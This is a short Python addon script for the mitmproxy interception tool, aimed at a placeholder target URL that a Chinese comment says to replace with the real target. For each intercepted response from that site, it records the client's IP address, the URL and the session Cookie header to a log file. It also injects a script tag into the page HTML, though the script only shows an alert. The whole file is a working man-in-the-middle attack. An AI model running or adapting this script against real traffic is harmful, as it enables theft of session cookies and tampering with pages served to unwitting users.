import os
import re
import chardet
#将 http://xxx.xxx.xxx 改为目标

def request(flow):
    # url=flow.request.url
    # flow.request.headers['User-Agent']='xxx'
    pass


def response(flow):
    url = flow.request.url
    print(url)
    if "http://xxx.xxx.xxx" in url:
        content = flow.response.content
        cookie = flow.request.headers['Cookie']
        ip = str(flow.client_conn.ip_address).split(":")[0]
        bytes_encoding = chardet.detect(content)['encoding']
        origin_html = content.decode(encoding=bytes_encoding, errors="ignore")
        if "</html>" in origin_html:
            insert_xss = '''<script>alert("you're hacked")</script></html>'''
            new_html = origin_html.replace("</html>", insert_xss)
            flow.response.text = new_html
        return_value = {'ip': ip, 'url': url, 'cookie': cookie}
        with open("mitm.log", "a+") as f:
            f.write(str(return_value) + "\n")